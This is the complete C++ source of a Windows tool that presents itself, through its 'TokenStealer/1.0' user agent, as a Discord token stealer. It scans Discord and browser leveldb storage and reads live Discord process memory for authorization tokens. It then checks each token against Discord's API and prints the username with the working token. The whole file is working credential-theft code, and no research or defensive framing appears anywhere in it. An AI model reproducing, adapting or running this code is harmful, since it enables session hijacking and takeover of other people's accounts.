#include <iostream>
#include <fstream>
#include <string>
#include <regex>
#include <vector>
#include <filesystem>
#include <map>
#include <set>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winhttp.h>
#include <conio.h>
#include <algorithm>

#pragma comment(lib, "winhttp.lib")
#pragma warning(disable: 4996)  // Suppress getenv warnings

#define RST "\033[0m"
#define RED "\033[31m"
#define GRN "\033[32m"
#define YLW "\033[33m"
#define CYN "\033[36m"
#define MGT "\033[35m"
#define CYNB "\033[96m"
#define GRNB "\033[92m"

void clscr() {
    system("cls");
}

namespace fs = std::filesystem;

// Define readable page protection flags
const std::set<DWORD> PAGE_READABLE = {PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READWRITE};

// Regular expressions for token matching
const std::regex TOKEN_RE(R"([\w-]{24,26}\.[\w-]{6}\.[\w-]{25,38})");
const std::regex MFA_RE(R"(mfa\.[\w-]{84})");

// Discord API endpoint
const std::wstring BASE = L"https://discord.com/api/v9";

struct PBI_LITE {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
};

struct UNI_STR {
    USHORT Length;
    USHORT MaximumLength;
    PVOID Buffer;
};

const char AUTH_ANCHOR[] = "Authorization";
const char V8_ANCHOR[] = "\x6D\x00\x00\x00\x05token\x6D\x00\x00\x00\x03";

// Classify a Discord process role from its command line (PEB walk via NtQueryInformationProcess)
std::string classifyCmd(DWORD pid) {
    HANDLE h = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!h) return "unknown";

    typedef LONG(NTAPI* pNtQIP)(HANDLE, ULONG, PULONG, ULONG, PULONG);
    static pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");

    std::string kind = "unknown";
    if (NtQIP) {
        PBI_LITE pbi{};
        if (NtQIP(h, 0, (PULONG)&pbi, sizeof(pbi), nullptr) >= 0 && pbi.PebBaseAddress) {
            PVOID pp = nullptr;
            SIZE_T rd = 0;
            if (ReadProcessMemory(h, (LPCVOID)((BYTE*)pbi.PebBaseAddress + 0x20), &pp, sizeof(pp), &rd)
                && rd == sizeof(pp) && pp) {
                UNI_STR us{};
                if (ReadProcessMemory(h, (LPCVOID)((BYTE*)pp + 0x70), &us, sizeof(us), &rd)
                    && rd == sizeof(us) && us.Length > 0 && us.Buffer) {
                    std::vector<wchar_t> buf(us.Length / sizeof(wchar_t) + 1);
                    if (ReadProcessMemory(h, us.Buffer, buf.data(), us.Length, &rd)) {
                        int n = WideCharToMultiByte(CP_UTF8, 0, buf.data(), (int)(us.Length / 2),
                                                    nullptr, 0, nullptr, nullptr);
                        std::string cl(n, '\0');
                        if (n > 0)
                            WideCharToMultiByte(CP_UTF8, 0, buf.data(), (int)(us.Length / 2),
                                                &cl[0], n, nullptr, nullptr);
                        if (cl.find("--type=renderer") != std::string::npos) kind = "renderer";
                        else if (cl.find("--type=gpu-process") != std::string::npos) kind = "gpu";
                        else if (cl.find("--type=utility") != std::string::npos) kind = "utility";
                        else if (cl.find("--type=crashpad") != std::string::npos) kind = "crashpad";
                        else if (cl.find("--type=") != std::string::npos) kind = "other";
                        else kind = "main";
                    }
                }
            }
        }
    }
    CloseHandle(h);
    return kind;
}

bool tokenBearing(const std::string& kind) {
    return kind == "main" || kind == "renderer" || kind == "unknown";
}

bool shouldScanRegion(const MEMORY_BASIC_INFORMATION& mbi) {
    return mbi.State == MEM_COMMIT
        && PAGE_READABLE.count(mbi.Protect)
        && !(mbi.Type & MEM_IMAGE)
        && mbi.RegionSize > 0
        && mbi.RegionSize < 50 * 1024 * 1024;
}

void grabFromWindow(const std::string& window, std::set<std::string>& out) {
    std::sregex_token_iterator end;
    for (std::sregex_token_iterator it(window.begin(), window.end(), TOKEN_RE); it != end; ++it)
        out.insert(*it);
    for (std::sregex_token_iterator it(window.begin(), window.end(), MFA_RE); it != end; ++it)
        out.insert(*it);
}

// Fast path: only decode/scan buffers that contain known token containers
bool scanProcessFast(HANDLE h, std::set<std::string>& out) {
    bool any = false;
    MEMORY_BASIC_INFORMATION mbi;
    LPCVOID address = 0;

    while (VirtualQueryEx(h, address, &mbi, sizeof(mbi))) {
        if (shouldScanRegion(mbi)) {
            std::vector<char> buffer(mbi.RegionSize);
            SIZE_T bytesRead;
            if (ReadProcessMemory(h, address, buffer.data(), mbi.RegionSize, &bytesRead)) {
                const char* data = buffer.data();
                const char* end = data + bytesRead;
                const char* p = data;
                while (p < end) {
                    const char* hit = std::search(p, end, AUTH_ANCHOR, AUTH_ANCHOR + sizeof(AUTH_ANCHOR) - 1);
                    if (hit == end)
                        hit = std::search(p, end, V8_ANCHOR, V8_ANCHOR + sizeof(V8_ANCHOR) - 1);
                    if (hit == end) break;

                    any = true;
                    size_t win = ((size_t)(end - hit) < 768) ? (size_t)(end - hit) : (size_t)768;
                    grabFromWindow(std::string(hit, win), out);
                    p = hit + 1;
                }
            }
        }

        if (mbi.RegionSize == 0) break;
        address = static_cast<LPCVOID>(static_cast<const char*>(address) + mbi.RegionSize);
    }
    return any;
}

// Fallback: full-heap regex scan across every readable region
void scanProcessFull(HANDLE h, const std::string& exeName, DWORD pid, std::set<std::string>& out) {
    MEMORY_BASIC_INFORMATION mbi;
    LPCVOID address = 0;
    SIZE_T total = 0;

    std::cout << YLW "  " << exeName << " pid " << pid << " heap scan:" RST << std::endl;
    while (VirtualQueryEx(h, address, &mbi, sizeof(mbi))) {
        if (shouldScanRegion(mbi)) {
            std::cout << YLW "    region 0x" << std::hex << (size_t)address << std::dec
                      << " size " << mbi.RegionSize << RST << std::endl;
            std::vector<char> buffer(mbi.RegionSize);
            SIZE_T bytesRead;
            if (ReadProcessMemory(h, address, buffer.data(), mbi.RegionSize, &bytesRead)) {
                total += bytesRead;
                std::string text(buffer.data(), bytesRead);
                grabFromWindow(text, out);
            }
        }

        if (mbi.RegionSize == 0) break;
        address = static_cast<LPCVOID>(static_cast<const char*>(address) + mbi.RegionSize);
    }
    std::cout << YLW "    " << exeName << " pid " << pid << " heap size " << total << " bytes" RST << std::endl;
}

// Function to test if a token is valid using WinHTTP
bool testToken(const std::string& token) {
    std::wstring url = BASE + L"/users/@me";
    std::wstring headers = L"Authorization: " + std::wstring(token.begin(), token.end()) + L"\r\n" +
                          L"Content-Type: application/json\r\n" +
                          L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n";
    
    HINTERNET hSession = WinHttpOpen(L"TokenStealer/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                    WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/api/v9/users/@me", 
                                          NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    BOOL result = WinHttpSendRequest(hRequest, headers.c_str(), static_cast<DWORD>(-1), 
                                    WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!result) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    result = WinHttpReceiveResponse(hRequest, NULL);
    if (!result) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
                       WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return statusCode == 200;
}

// Function to extract tokens from a file
void extractTokensFromFile(const fs::path& filePath, std::set<std::string>& candidates) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) return;
    
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    std::sregex_token_iterator end;
    for (std::sregex_token_iterator it(content.begin(), content.end(), TOKEN_RE); it != end; ++it) {
        candidates.insert(*it);
    }
    
    for (std::sregex_token_iterator it(content.begin(), content.end(), MFA_RE); it != end; ++it) {
        candidates.insert(*it);
    }
}

// Function to scan Discord processes for tokens
void scanDiscordProcesses(std::set<std::string>& mem_candidates) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    std::vector<DWORD> discordPids;
    std::vector<std::tuple<DWORD, std::string, std::string>> bearing;
    
    if (Process32First(snapshot, &pe32)) {
        do {
            std::string exeName = pe32.szExeFile;
            std::string exeLower = exeName;
            std::transform(exeLower.begin(), exeLower.end(), exeLower.begin(), [](unsigned char c){ return std::tolower(c); });
            
            if (exeLower == "discord.exe" || exeLower == "discordptb.exe" || exeLower == "discordcanary.exe") {
                discordPids.push_back(pe32.th32ProcessID);
                std::string kind = classifyCmd(pe32.th32ProcessID);
                if (tokenBearing(kind)) bearing.push_back({pe32.th32ProcessID, exeName, kind});
            }
        } while (Process32Next(snapshot, &pe32));
    }
    
    CloseHandle(snapshot);
    
    if (discordPids.empty()) {
        std::cout << RED "Discord is not running" RST << std::endl;
        return;
    }
    
    std::cout << YLW "Discord processes: " << discordPids.size()
              << ", token-bearing: " << bearing.size() << RST << std::endl;
    
    if (bearing.empty()) {
        std::cout << RED "No token-bearing Discord processes" RST << std::endl;
        return;
    }
    
    // Fast pass: only scan buffers containing known token containers (Authorization headers / V8 keys)
    std::cout << CYN "Scanning for authorization headers and V8 token keys..." RST << std::endl;
    bool foundFast = false;
    for (const auto& [pid, name, kind] : bearing) {
        HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!hProcess) continue;
        foundFast |= scanProcessFast(hProcess, mem_candidates);
        CloseHandle(hProcess);
    }
    
    // Fallback: full-heap scan only if the fast pass returned nothing
    if (!foundFast) {
        std::cout << YLW "Fast scan found nothing, falling back to full memory scan..." RST << std::endl;
        for (const auto& [pid, name, kind] : bearing) {
            HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
            if (!hProcess) continue;
            scanProcessFull(hProcess, name, pid, mem_candidates);
            CloseHandle(hProcess);
        }
    } else {
        std::cout << GRN "Fast scan found candidates, skipping full heap scan." RST << std::endl;
    }
}

int main() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD mode = 0;
    if (GetConsoleMode(hOut, &mode)) SetConsoleMode(hOut, mode | 4);
    
    clscr();
    
    char* localEnv = std::getenv("LOCALAPPDATA");
    char* roamEnv = std::getenv("APPDATA");
    std::string local = localEnv ? localEnv : "";
    std::string roam = roamEnv ? roamEnv : "";
    
    // Define paths to search
    std::map<std::string, std::string> paths = {
        {"Discord",        roam + "\\discord\\Local Storage\\leveldb"},
        {"Discord Canary", roam + "\\discordcanary\\Local Storage\\leveldb"},
        {"Discord PTB",    roam + "\\discordptb\\Local Storage\\leveldb"},
        {"Chrome",         local + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"},
        {"Edge",           local + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"},
        {"Brave",          local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"}
    };
    
    std::set<std::string> candidates;
    std::vector<std::pair<std::string, std::string>> validAccounts; // Store username-token pairs
    
    // First scan files for tokens using regex
    std::cout << CYN "Scanning local files for Discord tokens..." RST << std::endl;
    for (const auto& [name, path] : paths) {
        if (!fs::exists(path)) {
            std::cout << RED "  Path not found: " << path << RST << std::endl;
            continue;
        }
        
        std::cout << CYN "  Scanning " << name << " at " << path << RST << std::endl;
        try {
            for (const auto& entry : fs::directory_iterator(path)) {
                if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
                    try {
                        extractTokensFromFile(entry.path(), candidates);
                        std::cout << GRN "    Processed file: " << entry.path().filename().string() << RST << std::endl;
                    } catch (const std::exception& e) {
                        std::cerr << RED "    Error reading " << entry.path().filename().string() << ": " << e.what() << RST << std::endl;
                    }
                }
            }
        } catch (const std::exception& e) {
            std::cerr << RED "Error scanning " << name << ": " << e.what() << RST << std::endl;
        }
    }
    
    // Validate tokens found by regex
    std::cout << "\n" CYNB "Validating tokens found in files..." RST << std::endl;
    int foundInFiles = 0;
    for (const auto& token : candidates) {
        try {
            if (testToken(token)) {
                // Get user information from the API response
                std::wstring url = BASE + L"/users/@me";
                std::wstring headers = L"Authorization: " + std::wstring(token.begin(), token.end()) + L"\r\n" +
                                      L"Content-Type: application/json\r\n" +
                                      L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n";
                
                HINTERNET hSession = WinHttpOpen(L"TokenStealer/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
                if (hSession) {
                    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
                    if (hConnect) {
                        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/api/v9/users/@me", 
                                                              NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                                              WINHTTP_FLAG_SECURE);
                        if (hRequest) {
                            BOOL result = WinHttpSendRequest(hRequest, headers.c_str(), static_cast<DWORD>(-1), 
                                                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
                            if (result) {
                                result = WinHttpReceiveResponse(hRequest, NULL);
                                if (result) {
                                    DWORD statusCode = 0;
                                    DWORD statusSize = sizeof(statusCode);
                                    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
                                                      WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
                                    
                                    if (statusCode == 200) {
                                        DWORD dataSize = 0;
                                        
                                        // Get the size of the response
                                        WinHttpQueryDataAvailable(hRequest, &dataSize);
                                        if (dataSize > 0) {
                                            std::vector<char> responseData(dataSize + 1);
                                            DWORD bytesRead = 0;
                                            
                                            // Read the response data
                                            if (WinHttpReadData(hRequest, responseData.data(), dataSize, &bytesRead)) {
                                                responseData[bytesRead] = '\0';
                                                std::string response(responseData.data(), bytesRead);
                                                
                                                // Parse JSON response to extract username
                                                size_t usernamePos = response.find("\"username\":\"");
                                                if (usernamePos != std::string::npos) {
                                                    usernamePos += 12; // Skip "username":"
                                                    size_t usernameEnd = response.find("\"", usernamePos);
                                                    if (usernameEnd != std::string::npos) {
                                                        std::string username = response.substr(usernamePos, usernameEnd - usernamePos);
                                                        
                                                        validAccounts.push_back({username, token});
                                                        foundInFiles++;
                                                        std::cout << GRN "  Valid token found for user: " << username << RST << std::endl;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                                WinHttpCloseHandle(hRequest);
                            }
                            WinHttpCloseHandle(hConnect);
                        }
                        WinHttpCloseHandle(hSession);
                    }
                }
            }
        } catch (...) {
            // Ignore exceptions for invalid tokens
        }
    }
    
    if (foundInFiles == 0) {
        std::cout << RED "No Valid Accounts Found Using Regex" RST << std::endl;
    }
    
    // Scan Discord processes for tokens
    std::cout << "\n" CYNB "Scanning process memory for additional tokens..." RST << std::endl;
    std::set<std::string> mem_candidates;
    try {
        scanDiscordProcesses(mem_candidates);
    } catch (const std::exception& e) {
        std::cerr << RED "Memory scan failed: " << e.what() << RST << std::endl;
    }
    
    // Validate tokens found in memory
    std::cout << CYNB "Validating tokens found in memory..." RST << std::endl;
    int foundInMemory = 0;
    for (const auto& token : mem_candidates) {
        // Check if this token was already found in files
        bool alreadyFound = false;
        for (const auto& [username, existingToken] : validAccounts) {
            if (token == existingToken) {
                alreadyFound = true;
                break;
            }
        }
        
        if (alreadyFound) {
            continue; // Skip tokens we already have
        }
        
        try {
            if (testToken(token)) {
                // Get user information from the API response
                std::wstring url = BASE + L"/users/@me";
                std::wstring headers = L"Authorization: " + std::wstring(token.begin(), token.end()) + L"\r\n" +
                                      L"Content-Type: application/json\r\n" +
                                      L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n";
                
                HINTERNET hSession = WinHttpOpen(L"TokenStealer/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
                if (hSession) {
                    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
                    if (hConnect) {
                        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/api/v9/users/@me", 
                                                              NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                                              WINHTTP_FLAG_SECURE);
                        if (hRequest) {
                            BOOL result = WinHttpSendRequest(hRequest, headers.c_str(), static_cast<DWORD>(-1), 
                                                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
                            if (result) {
                                result = WinHttpReceiveResponse(hRequest, NULL);
                                if (result) {
                                    DWORD statusCode = 0;
                                    DWORD statusSize = sizeof(statusCode);
                                    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
                                                      WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
                                    
                                    if (statusCode == 200) {
                                        DWORD dataSize = 0;
                                        
                                        // Get the size of the response
                                        WinHttpQueryDataAvailable(hRequest, &dataSize);
                                        if (dataSize > 0) {
                                            std::vector<char> responseData(dataSize + 1);
                                            DWORD bytesRead = 0;
                                            
                                            // Read the response data
                                            if (WinHttpReadData(hRequest, responseData.data(), dataSize, &bytesRead)) {
                                                responseData[bytesRead] = '\0';
                                                std::string response(responseData.data(), bytesRead);
                                                
                                                // Parse JSON response to extract username
                                                size_t usernamePos = response.find("\"username\":\"");
                                                if (usernamePos != std::string::npos) {
                                                    usernamePos += 12; // Skip "username":"
                                                    size_t usernameEnd = response.find("\"", usernamePos);
                                                    if (usernameEnd != std::string::npos) {
                                                        std::string username = response.substr(usernamePos, usernameEnd - usernamePos);
                                                        
                                                        validAccounts.push_back({username, token});
                                                        foundInMemory++;
                                                        std::cout << GRN "  New valid token found in memory for user: " << username << RST << std::endl;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                                WinHttpCloseHandle(hRequest);
                            }
                            WinHttpCloseHandle(hConnect);
                        }
                        WinHttpCloseHandle(hSession);
                    }
                }
            }
        } catch (...) {
            // Ignore exceptions for invalid tokens
        }
    }
    
    if (foundInMemory == 0) {
        std::cout << RED "No other accounts found using memory scan" RST << std::endl;
    }
    
    // Final output
    std::cout << "\n" CYNB "Following Discord Accounts Were Found:" RST << std::endl;
    for (const auto& [username, token] : validAccounts) {
        std::cout << YLW "Username          :   " RST << username << std::endl;
        std::cout << MGT "Account Token     :   " RST << token << std::endl;
        std::cout << std::endl;
    }
    
    if (validAccounts.empty()) {
        std::cout << RED "No valid Discord accounts found" RST << std::endl;
    }
    
    std::cout << "\n" CYNB "Press Any Key To Exit..." RST << std::endl;
    _getch();
    
    return 0;
}